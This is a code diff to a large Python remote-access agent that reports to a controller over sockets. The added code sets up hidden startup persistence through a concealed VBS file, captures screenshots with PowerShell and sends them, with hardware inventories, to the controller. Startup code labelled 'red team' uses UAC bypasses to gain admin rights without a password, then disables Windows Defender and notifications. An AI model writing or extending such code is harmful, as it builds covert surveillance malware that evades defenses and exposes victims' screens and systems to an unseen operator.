+        _write_structured_debug({'event': 'bypass_test_result', **res}, 'info' if res.get('status') == 'success' else 'warning')
+    except Exception as e:
+        err = {'event': 'bypass_test_result', 'status': 'error', 'reason': str(e)}
+        _write_structured_debug(err, 'error')
+        try:
+            safe_emit('uac_bypass_test_result', err)
+        except Exception:
+            pass
 def get_webrtc_status():
     """Get comprehensive WebRTC status and capabilities."""
     status = {
@@ -15337,14 +16205,18 @@ def add_startup_folder_entry():
     try:
         startup_folder = os.path.join(os.environ["APPDATA"], 
                                     "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-        batch_file = os.path.join(startup_folder, "SystemService.bat")
-        
-        with open(batch_file, "w") as f:
-            f.write(f'@echo off\nstart "" "{sys.executable}" "{os.path.abspath(__file__)}"\n')
+        vbs_file = os.path.join(startup_folder, "ClientService.vbs")
+        cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+        vbs_content = (
+            'Set oShell = CreateObject("WScript.Shell")\n'
+            f'oShell.Run "{cmd}", 0, false\n'
+        )
+        with open(vbs_file, "w") as f:
+            f.write(vbs_content)
         
         # Hide the file
         try:
-            subprocess.run(["attrib", "+h", batch_file], capture_output=True)
+            subprocess.run(["attrib", "+h", vbs_file], capture_output=True)
         except:
             pass
         log_message("[OK] Added to startup folder")
@@ -16011,6 +16883,143 @@ class SystemInfoGatherer:
                 safe_emit('installed_software_response', {'agent_id': self.agent_id, 'software': software, 'count': len(software), 'success': True})
             except Exception as e:
                 safe_emit('installed_software_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
+        
+        @self.socket.on('get_hardware_info')
+        def handle_get_hardware_info(data):
+            """Get comprehensive hardware inventory information"""
+            try:
+                hardware = self.get_hardware_inventory()
+                safe_emit('hardware_info_response', {'agent_id': self.agent_id, 'hardware': hardware, 'success': True})
+            except Exception as e:
+                safe_emit('hardware_info_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
+
+        @self.socket.on('get_screenshot')
+        def handle_get_screenshot(data):
+            """Capture and return a single screenshot with enhanced error handling."""
+            try:
+                debug_enabled = False
+                import os
+                import json
+                import datetime
+                from screenshot_accuracy import build_screenshot_metrics
+
+                debug_enabled = os.getenv("SCREENSHOT_DEBUG") == "1" or os.getenv("ENV") == "development"
+                def log_event(event_type: str, message: str, **extra):
+                    payload = {"timestamp": datetime.datetime.utcnow().isoformat() + "Z", "event": event_type, "message": message}
+                    payload.update(extra)
+                    print(f"[Screenshot] {json.dumps(payload, ensure_ascii=False)}")
+
+                print(f"[Screenshot] Received screenshot request, agent ID: {self.agent_id}")
+                log_event("request", "Screenshot request received", agent_id=self.agent_id)
+                
+                # Validate input data
+                if not data or not isinstance(data, dict):
+                    raise Exception("Invalid screenshot request data")
+                
+                # Validate agent ID
+                request_agent_id = data.get('agent_id')
+                if not request_agent_id or request_agent_id != self.agent_id:
+                    print(f"[Screenshot] Request not for current agent (request: {request_agent_id}, current: {self.agent_id})")
+                    log_event("skip", "Screenshot request ignored for different agent", request_agent_id=request_agent_id, agent_id=self.agent_id)
+                    return
+                
+                print("[Screenshot] Starting screen capture...")
+                log_event("start", "Screenshot capture started", agent_id=self.agent_id)
+                if debug_enabled:
+                    breakpoint()
+                
+                # Try to capture screen (up to 3 retries)
+                screenshot_data = None
+                last_error = None
+                attempts_used = 0
+                capture_start = time.time()
+                
+                for attempt in range(3):
+                    try:
+                        print(f"[Screenshot] Attempt {attempt + 1}/3")
+                        attempts_used = attempt + 1
+                        log_event("attempt", "Screenshot capture attempt", attempt=attempts_used)
+                        screenshot_data = self.capture_screen_base64()
+                        
+                        # Validate screenshot data
+                        if screenshot_data and len(screenshot_data) > 100:  # 最小有效base64 PNG数据
+                            print(f"[Screenshot] Successfully captured screen, data size: {len(screenshot_data)} characters")
+                            break
+                        else:
+                            raise Exception("Screenshot data too small or invalid")
+                            
+                    except Exception as e:
+                        last_error = str(e)
+                        print(f"[Screenshot] Attempt {attempt + 1} failed: {last_error}")
+                        log_event("attempt_failed", "Screenshot attempt failed", attempt=attempts_used, error=last_error)
+                        
+                        if attempt < 2:  # Not the last attempt
+                            import time
+                            time.sleep(0.5)  # Wait half second then retry
+                        else:
+                            raise  # Last attempt, throw exception
+                
+                if screenshot_data:
+                    duration_ms = int((time.time() - capture_start) * 1000)
+                    image_size = len(screenshot_data)
+                    metrics = build_screenshot_metrics(
+                        success=True,
+                        duration_ms=duration_ms,
+                        size=image_size,
+                        attempts=attempts_used,
+                    )
+                    print("[Screenshot] Screenshot capture successful, sending response...")
+                    safe_emit('screenshot_response', {
+                        'agent_id': self.agent_id, 
+                        'image': screenshot_data, 
+                        'success': True,
+                        'duration_ms': metrics.get("duration_ms"),
+                        'attempts': metrics.get("attempts"),
+                        'image_size': metrics.get("image_size"),
+                        'accuracy': metrics.get("accuracy"),
+                        'timestamp': int(time.time() * 1000)
+                    })
+                    log_event("success", "Screenshot response sent", duration_ms=metrics.get("duration_ms"), attempts=metrics.get("attempts"), image_size=metrics.get("image_size"), accuracy=metrics.get("accuracy"))
+                    print("[Screenshot] Response sending completed")
+                else:
+                    raise Exception(last_error or "Screenshot capture failed")
+                    
+            except Exception as e:
+                error_msg = f"Screenshot capture failed: {str(e)}"
+                duration_ms = None
+                try:
+                    duration_ms = int((time.time() - capture_start) * 1000)
+                except Exception:
+                    duration_ms = None
+                metrics = None
+                try:
+                    from screenshot_accuracy import build_screenshot_metrics
+                    metrics = build_screenshot_metrics(
+                        success=False,
+                        duration_ms=duration_ms,
+                        size=0,
+                        attempts=attempts_used if 'attempts_used' in locals() else 1,
+                        error=error_msg,
+                    )
+                except Exception:
+                    metrics = {"accuracy": 0.0, "duration_ms": duration_ms or 0, "image_size": 0, "attempts": attempts_used if 'attempts_used' in locals() else 1}
+                print(f"[Screenshot] Error: {error_msg}")
+                try:
+                    log_event("error", "Screenshot capture failed", error=error_msg, duration_ms=metrics.get("duration_ms") if metrics else None, accuracy=metrics.get("accuracy") if metrics else None)
+                except Exception:
+                    pass
+                if debug_enabled:
+                    breakpoint()
+                safe_emit('screenshot_response', {
+                    'agent_id': self.agent_id, 
+                    'error': error_msg, 
+                    'success': False,
+                    'duration_ms': metrics.get("duration_ms") if metrics else duration_ms,
+                    'attempts': metrics.get("attempts") if metrics else attempts_used if 'attempts_used' in locals() else 1,
+                    'image_size': metrics.get("image_size") if metrics else 0,
+                    'accuracy': metrics.get("accuracy") if metrics else 0,
+                    'timestamp': int(time.time() * 1000)
+                })
     def get_basic_info(self):
         return {'hostname': socket.gethostname(), 'platform': platform.system(), 'platform_release': platform.release(), 'architecture': platform.machine(), 'processor': platform.processor(), 'username': os.getenv('USERNAME') or os.getenv('USER'), 'timestamp': datetime.datetime.now().isoformat()}
     def get_standard_info(self):
@@ -16211,10 +17220,410 @@ class SystemInfoGatherer:
                 unique.append(item)
         unique.sort(key=lambda x: (x.get('name') or '').lower())
         return unique
+
+    def get_hardware_inventory(self):
+        """Get comprehensive hardware inventory information"""
+        hardware = {}
+        
+        try:
+            import psutil
+            import platform
+            import subprocess
+            import socket
+            
+            # CPU Information
+            try:
+                cpu_info = {
+                    'name': platform.processor() or 'Unknown',
+                    'cores': psutil.cpu_count(logical=False) or 0,
+                    'threads': psutil.cpu_count(logical=True) or 0,
+                    'frequency': 0,
+                    'architecture': platform.machine(),
+                    'vendor': 'Unknown'
+                }
+                
+                # Get CPU frequency
+                freq = psutil.cpu_freq()
+                if freq:
+                    cpu_info['frequency'] = freq.current
+                
+                # Get detailed CPU info on Windows
+                if platform.system() == 'Windows':
+                    try:
+                        result = subprocess.run(['wmic', 'cpu', 'get', 'Name,Manufacturer,MaxClockSpeed', '/format:list'], 
+                                              capture_output=True, text=True, timeout=5)
+                        for line in result.stdout.split('\n'):
+                            if '=' in line:
+                                key, value = line.split('=', 1)
+                                if 'Name' in key and value.strip():
+                                    cpu_info['name'] = value.strip()
+                                elif 'Manufacturer' in key and value.strip():
+                                    cpu_info['vendor'] = value.strip()
+                                elif 'MaxClockSpeed' in key and value.strip():
+                                    cpu_info['frequency'] = float(value.strip())
+                    except Exception:
+                        pass
+                
+                hardware['cpu'] = cpu_info
+            except Exception:
+                pass
+            
+            # Memory Information
+            try:
+                memory = psutil.virtual_memory()
+                hardware['memory'] = {
+                    'total': memory.total,
+                    'available': memory.available,
+                    'used': memory.used,
+                    'type': 'DDR4',  # Default, would need more detailed detection
+                    'speed': 0
+                }
+                
+                # Get memory info on Windows
+                if platform.system() == 'Windows':
+                    try:
+                        result = subprocess.run(['wmic', 'memorychip', 'get', 'Speed,Capacity', '/format:list'], 
+                                              capture_output=True, text=True, timeout=5)
+                        total_capacity = 0
+                        max_speed = 0
+                        for line in result.stdout.split('\n'):
+                            if '=' in line:
+                                key, value = line.split('=', 1)
+                                if 'Capacity' in key and value.strip():
+                                    total_capacity += int(value.strip())
+                                elif 'Speed' in key and value.strip():
+                                    speed = int(value.strip())
+                                    if speed > max_speed:
+                                        max_speed = speed
+                        
+                        if total_capacity > 0:
+                            hardware['memory']['total'] = total_capacity
+                        if max_speed > 0:
+                            hardware['memory']['speed'] = max_speed
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            
+            # Storage Information
+            try:
+                storage_devices = []
+                for partition in psutil.disk_partitions():
+                    try:
+                        usage = psutil.disk_usage(partition.mountpoint)
+                        device_info = {
+                            'name': partition.device,
+                            'size': usage.total,
+                            'type': partition.fstype,
+                            'interface': 'SATA',  # Default, would need more detection
+                            'health': 'Good' if usage.percent < 90 else 'Warning'
+                        }
+                        storage_devices.append(device_info)
+                    except Exception:
+                        continue
+                
+                # Get storage info on Windows
+                if platform.system() == 'Windows':
+                    try:
+                        result = subprocess.run(['wmic', 'diskdrive', 'get', 'Model,Size,InterfaceType', '/format:list'], 
+                                              capture_output=True, text=True, timeout=5)
+                        for line in result.stdout.split('\n'):
+                            if '=' in line:
+                                key, value = line.split('=', 1)
+                                if 'Model' in key and value.strip():
+                                    # Try to match with existing devices
+                                    for device in storage_devices:
+                                        if device['name'] in value.strip() or value.strip() in device['name']:
+                                            device['name'] = value.strip()
+                                elif 'InterfaceType' in key and value.strip():
+                                    for device in storage_devices:
+                                        device['interface'] = value.strip()
+                    except Exception:
+                        pass
+                
+                hardware['storage'] = storage_devices[:5]  # Limit to first 5 devices
+            except Exception:
+                pass
+            
+            # GPU Information
+            try:
+                gpu_devices = []
+                
+                # Get GPU info on Windows
+                if platform.system() == 'Windows':
+                    try:
+                        result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'Name,AdapterRAM,DriverVersion', '/format:list'], 
+                                              capture_output=True, text=True, timeout=5)
+                        current_gpu = {}
+                        for line in result.stdout.split('\n'):
+                            if '=' in line:
+                                key, value = line.split('=', 1)
+                                if 'Name' in key and value.strip():
+                                    if current_gpu:
+                                        gpu_devices.append(current_gpu)
+                                    current_gpu = {
+                                        'name': value.strip(),
+                                        'memory': 0,
+                                        'driver': 'Unknown',
+                                        'vendor': 'Unknown'
+                                    }
+                                elif 'AdapterRAM' in key and value.strip():
+                                    current_gpu['memory'] = int(value.strip())
+                                elif 'DriverVersion' in key and value.strip():
+                                    current_gpu['driver'] = value.strip()
+                        
+                        if current_gpu:
+                            gpu_devices.append(current_gpu)
+                    except Exception:
+                        pass
+                
+                # Fallback to basic detection
+                if not gpu_devices:
+                    try:
+                        # Try to detect from platform info
+                        gpu_name = 'Integrated Graphics'
+                        if 'NVIDIA' in platform.processor().upper():
+                            gpu_name = 'NVIDIA Graphics'
+                        elif 'AMD' in platform.processor().upper():
+                            gpu_name = 'AMD Graphics'
+                        elif 'INTEL' in platform.processor().upper():
+                            gpu_name = 'Intel Graphics'
+                        
+                        gpu_devices.append({
+                            'name': gpu_name,
+                            'memory': 0,
+                            'driver': 'Unknown',
+                            'vendor': 'Unknown'
+                        })
+                    except Exception:
+                        pass
+                
+                hardware['gpu'] = gpu_devices[:3]  # Limit to first 3 GPUs
+            except Exception:
+                pass
+            
+            # Network Information
+            try:
+                network_interfaces = []
+                for name, addrs in psutil.net_if_addrs().items():
+                    interface_info = {
+                        'name': name,
+                        'mac': '',
+                        'ip': '',
+                        'type': 'Ethernet'
+                    }
+                    
+                    for addr in addrs:
+                        if addr.family == psutil.AF_LINK:  # MAC address
+                            interface_info['mac'] = addr.address
+                        elif addr.family == socket.AF_INET:  # IPv4
+                            interface_info['ip'] = addr.address
+                    
+                    # Determine interface type
+                    if 'wlan' in name.lower() or 'wifi' in name.lower():
+                        interface_info['type'] = 'WiFi'
+                    elif 'eth' in name.lower():
+                        interface_info['type'] = 'Ethernet'
+                    elif 'bluetooth' in name.lower():
+                        interface_info['type'] = 'Bluetooth'
+                    else:
+                        interface_info['type'] = 'Unknown'
+                    
+                    network_interfaces.append(interface_info)
+                
+                hardware['network'] = network_interfaces[:5]  # Limit to first 5 interfaces
+            except Exception:
+                pass
+            
+            # Peripherals Information
+            try:
+                peripherals = []
+                
+                # Get USB devices on Windows
+                if platform.system() == 'Windows':
+                    try:
+                        result = subprocess.run(['wmic', 'path', 'win32_PnPEntity', 'get', 'Name,Manufacturer,PNPDeviceID', '/format:list'], 
+                                              capture_output=True, text=True, timeout=10)
+                        current_device = {}
+                        for line in result.stdout.split('\n'):
+                            if '=' in line:
+                                key, value = line.split('=', 1)
+                                if 'Name' in key and value.strip():
+                                    if current_device:
+                                        peripherals.append(current_device)
+                                    current_device = {
+                                        'name': value.strip(),
+                                        'type': 'Unknown',
+                                        'vendor': 'Unknown',
+                                        'connected': True
+                                    }
+                                elif 'Manufacturer' in key and value.strip():
+                                    current_device['vendor'] = value.strip()
+                                elif 'PNPDeviceID' in key and value.strip():
+                                    # Try to determine device type from PNP ID
+                                    pnp_id = value.strip().upper()
+                                    if 'USB' in pnp_id:
+                                        current_device['type'] = 'USB Device'
+                                    elif 'AUDIO' in pnp_id:
+                                        current_device['type'] = 'Audio Device'
+                                    elif 'KEYBOARD' in pnp_id:
+                                        current_device['type'] = 'Keyboard'
+                                    elif 'MOUSE' in pnp_id:
+                                        current_device['type'] = 'Mouse'
+                                    elif 'CAMERA' in pnp_id or 'IMAGE' in pnp_id:
+                                        current_device['type'] = 'Camera'
+                                    elif 'STORAGE' in pnp_id:
+                                        current_device['type'] = 'Storage Device'
+                        
+                        if current_device:
+                            peripherals.append(current_device)
+                    except Exception:
+                        pass
+                
+                # Add common peripherals if none found
+                if not peripherals:
+                    common_peripherals = [
+                        {'name': 'Standard Keyboard', 'type': 'Keyboard', 'vendor': 'Generic', 'connected': True},
+                        {'name': 'Standard Mouse', 'type': 'Mouse', 'vendor': 'Generic', 'connected': True},
+                        {'name': 'System Speakers', 'type': 'Audio Device', 'vendor': 'Generic', 'connected': True}
+                    ]
+                    peripherals.extend(common_peripherals)
+                
+                hardware['peripherals'] = peripherals[:10]  # Limit to first 10 peripherals
+            except Exception:
+                pass
+            
+            # Motherboard Information
+            try:
+                motherboard = {
+                    'manufacturer': 'Unknown',
+                    'model': 'Unknown',
+                    'bios': 'Unknown'
+                }
+                
+                # Get motherboard info on Windows
+                if platform.system() == 'Windows':
+                    try:
+                        result = subprocess.run(['wmic', 'baseboard', 'get', 'Manufacturer,Product', '/format:list'], 
+                                              capture_output=True, text=True, timeout=5)
+                        for line in result.stdout.split('\n'):
+                            if '=' in line:
+                                key, value = line.split('=', 1)
+                                if 'Manufacturer' in key and value.strip():
+                                    motherboard['manufacturer'] = value.strip()
+                                elif 'Product' in key and value.strip():
+                                    motherboard['model'] = value.strip()
+                        
+                        # Get BIOS info
+                        result = subprocess.run(['wmic', 'bios', 'get', 'Manufacturer,Version', '/format:list'], 
+                                              capture_output=True, text=True, timeout=5)
+                        for line in result.stdout.split('\n'):
+                            if '=' in line:
+                                key, value = line.split('=', 1)
+                                if 'Manufacturer' in key and value.strip():
+                                    motherboard['bios'] = value.strip()
+                                elif 'Version' in key and value.strip():
+                                    motherboard['bios'] += f" {value.strip()}"
+                    except Exception:
+                        pass
+                
+                hardware['motherboard'] = motherboard
+            except Exception:
+                pass
+            
+        except Exception as e:
+            print(f"Error getting hardware inventory: {e}")
+        
+        return hardware
+
+    def capture_screen_base64(self):
+        """Capture screen via PowerShell and return base64-encoded PNG."""
+        try:
+            import subprocess
+            ps = r'''
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap = New-Object System.Drawing.Bitmap $vs.Width, $vs.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($vs.Left, $vs.Top, 0, 0, $bitmap.Size)
+$ms = New-Object System.IO.MemoryStream
+$bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+$bytes = $ms.ToArray()
+$base64 = [System.Convert]::ToBase64String($bytes)
+Write-Output $base64
+$graphics.Dispose()
+$bitmap.Dispose()
+$ms.Dispose()
+'''
+            result = subprocess.run(
+                ["powershell", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            if result.returncode != 0:
+                err = (result.stderr or "").strip()
+                raise Exception(err or "PowerShell capture failed")
+            base64_data = (result.stdout or "").strip()
+            if not base64_data or len(base64_data) < 100:
+                raise Exception("Invalid screenshot data")
+            return base64_data
+        except Exception as e:
+            raise
+    
+    def _capture_screen_fallback(self):
+        """Screenshot capture fallback solution"""
+        try:
+            import pyautogui
+            import io
+            import base64
+            
+            print("[Screenshot] Using pyautogui fallback solution")
+            
+            # Validate pyautogui availability
+            screen_size = pyautogui.size()
+            if screen_size.width <= 0 or screen_size.height <= 0:
+                raise Exception("Screen dimensions invalid")
+            
+            # Capture screen
+            screenshot = pyautogui.screenshot()
+            
+            # Validate screenshot
+            if not screenshot:
+                raise Exception("pyautogui screenshot failed")
+            
+            # Convert to byte array
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='PNG')
+            
+            # Validate PNG data
+            png_data = img_byte_arr.getvalue()
+            if not png_data or len(png_data) == 0:
+                raise Exception("PNG conversion failed")
+            
+            # Encode to base64
+            base64_data = base64.b64encode(png_data).decode('utf-8')
+            
+            if not base64_data:
+                raise Exception("Base64 encoding failed")
+            
+            return base64_data
+            
+        except ImportError as e:
+            print(f"[Screenshot] pyautogui import failed: {e}")
+            raise Exception("No screen capture library available (mss or pyautogui)")
+        except Exception as e:
+            print(f"[Screenshot] Fallback solution failed: {e}")
+            raise Exception(f"Screen capture failed: {str(e)}")
+
 def agent_main():
     """Main function for agent mode (original main functionality)."""
+    global VERSION
+    VERSION = "2.1"  # Define version for updater system
+    
     log_message("=" * 60)
-    log_message("Advanced Python Agent v2.0")
+    log_message(f"Advanced Python Agent v{VERSION}")
     log_message("Starting up...")
     log_message("=" * 60)
     # Initialize stealth enhancer hooks if available
@@ -16303,6 +17712,45 @@ def agent_main():
         # Get or create agent ID
         agent_id = get_or_create_agent_id()
         log_message(f"[OK] Agent starting with ID: {agent_id}")
+        
+        # Update rollback manager with agent ID
+        rollback_manager.update_agent_id(agent_id)
+        
+        # Update update logger with agent ID
+        update_logger.update_agent_id(agent_id)
+        
+        # Initialize updater system
+        if UPDATER_AVAILABLE:
+            log_message("[INFO] Initializing updater system...")
+            try:
+                # Start file integrity monitoring
+                test_file = "test_update_trigger.txt"
+                if os.path.exists(test_file):
+                    file_monitor.start_monitoring([test_file])
+                    log_message(f"[OK] File monitoring started for test file: {test_file}")
+                else:
+                    file_monitor.start_monitoring([__file__])
+                    log_message("[OK] File monitoring started for main script")
+                
+                # Test logging system
+                update_logger.log_update_activity('agent_startup', {
+                    'message': 'Agent started with updater system',
+                    'agent_id': agent_id,
+                    'version': VERSION
+                })
+                
+                update_status_reporter.update_status('agent_startup', {
+                    'agent_id': agent_id,
+                    'version': VERSION,
+                    'timestamp': time.time()
+                })
+                
+                log_message("[OK] Updater system initialized successfully")
+            except Exception as e:
+                log_message(f"[WARN] Failed to initialize updater system: {e}", "warning")
+        else:
+            log_message("[WARN] Updater system not available", "warning")
+        
         # Notify controller if running client-only
         try:
             notify_controller_client_only(agent_id)
@@ -16393,7 +17841,7 @@ def agent_main():
                 try:
                     log_message(f"[INFO] Registering agent {agent_id} with controller...")
                     
-                    # ✅ SAFE EMIT: Critical registration path
+                    # [ OK ] SAFE EMIT: Critical registration path
                     if not safe_emit('agent_connect', {
         'agent_id': agent_id,
         'hostname': socket.gethostname(),
@@ -16435,7 +17883,7 @@ def agent_main():
                         }
                     }
                     
-                    # ✅ SAFE EMIT: Critical system info
+                    # [ OK ] SAFE EMIT: Critical system info
                     if not safe_emit('agent_info', system_info):
                         log_message(f"[ERROR] Failed to send system info - connection issue", "error")
                     else:
@@ -16548,6 +17996,13 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
+    # Support for PyInstaller multiprocessing on Windows
+    try:
+        import multiprocessing
+        multiprocessing.freeze_support()
+    except ImportError:
+        pass
+
     # Check if we're being imported by an elevated script (prevents recursive execution)
     if os.environ.get('ELEVATED_MODE') == '1':
         # We're in elevated mode - don't run main startup, just provide functions
@@ -16591,11 +18046,11 @@ if __name__ == "__main__":
                 except Exception as e:
                     print(f"[STARTUP] UAC registry import error: {e}")
                 if result_first:
-                    print("[STARTUP] ✅ UAC registry import applied")
+                    print("[STARTUP] [ OK ] UAC registry import applied")
                 else:
-                    print("[STARTUP] ⚠️ UAC registry import failed (check permissions)")
+                    print("[STARTUP] [ ! ] UAC registry import failed (check permissions)")
             else:
-                print("[STARTUP] ❌ Still not admin - registry import skipped")
+                print("[STARTUP] [ X ] Still not admin - registry import skipped")
             print("=" * 80)
         except Exception as e:
             print(f"[STARTUP] Unexpected error in first action: {e}")
@@ -16604,7 +18059,7 @@ if __name__ == "__main__":
     # Use fodhelper.exe to automatically elevate to admin BEFORE Defender can block
     if False:
         print("=" * 80)
-        print("[RED TEAM] 🚨 AGGRESSIVE UAC BYPASS INITIATED")
+        print("[RED TEAM] [!] AGGRESSIVE UAC BYPASS INITIATED")
         print("[RED TEAM] Using fodhelper.exe to auto-elevate to admin privileges")
         print("[RED TEAM] This prevents Windows Defender from blocking execution!")
         print("=" * 80)
@@ -16612,24 +18067,24 @@ if __name__ == "__main__":
         try:
             # Use the existing fodhelper bypass to elevate immediately
             if bypass_uac_fodhelper_protocol():
-                print("[RED TEAM] ✅ UAC bypass initiated via fodhelper.exe")
-                print("[RED TEAM] ⏳ Waiting for elevation to complete...")
+                print("[RED TEAM] [ OK ] UAC bypass initiated via fodhelper.exe")
+                print("[RED TEAM] [...] Waiting for elevation to complete...")
                 
                 # Wait a moment for the elevation to take effect
                 time.sleep(3)
                 
                 # Check if we're now admin
                 if is_admin():
-                    print("[RED TEAM] ✅✅✅ SUCCESSFULLY ELEVATED TO ADMIN!")
+                    print("[RED TEAM] [ OK ][ OK ][ OK ] SUCCESSFULLY ELEVATED TO ADMIN!")
                     print("[RED TEAM] Windows Defender can no longer block execution!")
                 else:
-                    print("[RED TEAM] ⚠️ UAC bypass initiated but not yet elevated")
+                    print("[RED TEAM] [ ! ] UAC bypass initiated but not yet elevated")
                     print("[RED TEAM] Continuing with standard startup...")
             else:
-                print("[RED TEAM] ⚠️ Fodhelper bypass failed - continuing normally")
+                print("[RED TEAM] [ ! ] Fodhelper bypass failed - continuing normally")
                 
         except Exception as e:
-            print(f"[RED TEAM] ❌ UAC bypass error: {e}")
+            print(f"[RED TEAM] [ X ] UAC bypass error: {e}")
             print("[RED TEAM] Continuing with standard startup...")
         
         print("=" * 80)
@@ -16646,9 +18101,9 @@ if __name__ == "__main__":
         print("=" * 80)
         
         if is_admin():
-            print("[STARTUP] ✅ Already running as Administrator")
+            print("[STARTUP] [OK] Already running as Administrator")
         else:
-            print("[STARTUP] ⚪ Running as Standard User")
+            print("[STARTUP] [-] Running as Standard User")
         
         print("=" * 80)
     
@@ -16662,9 +18117,9 @@ if __name__ == "__main__":
         print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
         try:
             if disable_wsl_routing():
-                print("[STARTUP] ✅ WSL routing disabled - commands will use PowerShell directly")
+                print("[STARTUP] [OK] WSL routing disabled - commands will use PowerShell directly")
             else:
-                print("[STARTUP] ⚠️ WSL routing disable failed (not critical)")
+                print("[STARTUP] [!] WSL routing disable failed (not critical)")
         except Exception as e:
             print(f"[STARTUP] WSL routing error: {e}")
         
@@ -16680,18 +18135,18 @@ if __name__ == "__main__":
                 print(f"[STARTUP] Admin acquisition attempt {attempt + 1}/{max_attempts}...")
                 
                 if is_admin():
-                    print("[STARTUP] ✅ Already running as Administrator")
+                    print("[STARTUP] [OK] Already running as Administrator")
                     admin_acquired = True
                     break
                     
                 try:
                     if bootstrap_uac_disable_no_admin():
-                        print("[STARTUP] ✅✅✅ ADMIN PRIVILEGES ACQUIRED SUCCESSFULLY!")
-                        print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
+                        print("[STARTUP] [OK] ADMIN PRIVILEGES ACQUIRED SUCCESSFULLY!")
+                        print("[STARTUP] [OK] Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
                         admin_acquired = True
                         break
                     else:
-                        print(f"[STARTUP] ⚠️ UAC bypass attempt {attempt + 1} failed")
+                        print(f"[STARTUP] [!] UAC bypass attempt {attempt + 1} failed")
                         time.sleep(2)
                         
                 except Exception as e:
@@ -16699,36 +18154,36 @@ if __name__ == "__main__":
                     time.sleep(2)
             
             if not admin_acquired:
-                print("[STARTUP] ❌ CRITICAL: Could not acquire admin privileges!")
-                print("[STARTUP] ⚠️ Security feature disable may be limited without admin rights")
-                print("[STARTUP] ℹ️ Agent will continue but some protections may remain active")
+                print("[STARTUP] [X] CRITICAL: Could not acquire admin privileges!")
+                print("[STARTUP] [!] Security feature disable may be limited without admin rights")
+                print("[STARTUP] [i] Agent will continue but some protections may remain active")
             else:
-                print("[STARTUP] ✅ ADMIN PRIVILEGES SECURED - PROCEEDING WITH SECURITY DISABLE")
+                print("[STARTUP] [OK] ADMIN PRIVILEGES SECURED - PROCEEDING WITH SECURITY DISABLE")
         
         # Verify current admin status
         current_admin = is_admin()
-        print(f"[STARTUP] Current admin status: {'✅ ADMIN' if current_admin else '❌ STANDARD USER'}")
+        print(f"[STARTUP] Current admin status: {'[OK] ADMIN' if current_admin else '[X] STANDARD USER'}")
         
         # 2. Disable Windows Defender
         if DEFENDER_DISABLE_ENABLED:
             print("\n[STARTUP] Step 2: Disabling Windows Defender...")
             try:
                 if disable_defender():
-                    print("[STARTUP] ✅ Windows Defender disabled successfully")
+                    print("[STARTUP] [OK] Windows Defender disabled successfully")
                 else:
-                    print("[STARTUP] ℹ️ Defender disable failed - will retry in background")
+                    print("[STARTUP] [i] Defender disable failed - will retry in background")
             except Exception as e:
-                print(f"[STARTUP] ℹ️ Defender disable error (non-critical): {e}")
+                print(f"[STARTUP] [i] Defender disable error (non-critical): {e}")
         
         # 3. Disable Windows notifications
         print("\n[STARTUP] Step 3: Disabling Windows notifications...")
         try:
             if REGISTRY_ENABLED and disable_windows_notifications():
-                print("[STARTUP] ✅ Notifications disabled successfully")
+                print("[STARTUP] [OK] Notifications disabled successfully")
             else:
-                print("[STARTUP] ℹ️ Notification disable failed - will retry in background")
+                print("[STARTUP] [i] Notification disable failed - will retry in background")
         except Exception as e:
-            print(f"[STARTUP] ℹ️ Notification disable error (non-critical): {e}")
+            print(f"[STARTUP] [i] Notification disable error (non-critical): {e}")
         
         print("\n" + "=" * 80)
         print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
@@ -16742,7 +18197,7 @@ if __name__ == "__main__":
             print(f"[STARTUP] Status check error: {e}")
         
         print("=" * 80)
-        print("[STARTUP] ⚠️ IMPORTANT: RESTART REQUIRED for UAC changes to take full effect!")
+        print("[STARTUP] [ ! ] IMPORTANT: RESTART REQUIRED for UAC changes to take full effect!")
         print("=" * 80)
         
     except Exception as e:
@@ -16775,17 +18230,17 @@ if __name__ == "__main__":
         log_message("Initializing system components...")
         log_message("=" * 60)
         log_message("WebRTC Optimization Features:")
-        log_message("  ✓ Bandwidth estimation & adaptive bitrate control")
-        log_message("  ✓ Intelligent frame dropping under load")
-        log_message("  ✓ Connection quality monitoring & auto-reconnection")
-        log_message("  ✓ Production scale planning (mediasoup migration)")
-        log_message("  ✓ Enhanced performance tuning & monitoring")
+        log_message("  [OK] Bandwidth estimation & adaptive bitrate control")
+        log_message("  [OK] Intelligent frame dropping under load")
+        log_message("  [OK] Connection quality monitoring & auto-reconnection")
+        log_message("  [OK] Production scale planning (mediasoup migration)")
+        log_message("  [OK] Enhanced performance tuning & monitoring")
         log_message("=" * 60)
     
-    # CRITICAL FIX: Call main_unified() which contains the persistence logic
-    print("[STARTUP] Calling main_unified()...")
+    # CRITICAL FIX: Call main() which contains the persistence logic
+    print("[STARTUP] Calling main()...")
     try:
-        main_unified()
+        main()
     except KeyboardInterrupt:
         print("System shutdown requested.")
     except ImportError as e:
@@ -17051,7 +18506,7 @@ def screen_send_worker(agent_id):
     
     log_message("Screen send stopped")
 
-# ✅ NOW DEFINE stream_screen_h264_socketio AFTER worker functions exist
+# [ OK ] NOW DEFINE stream_screen_h264_socketio AFTER worker functions exist
 def stream_screen_h264_socketio(agent_id):
     """Modern H.264 screen streaming with SocketIO."""
     global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
@@ -17071,7 +18526,7 @@ def stream_screen_h264_socketio(agent_id):
         t.start()
     log_message(f"Started modern non-blocking video stream at {TARGET_FPS} FPS.")
 
-# ✅ NOW DEFINE stream_screen_webrtc_or_socketio AFTER stream_screen_h264_socketio
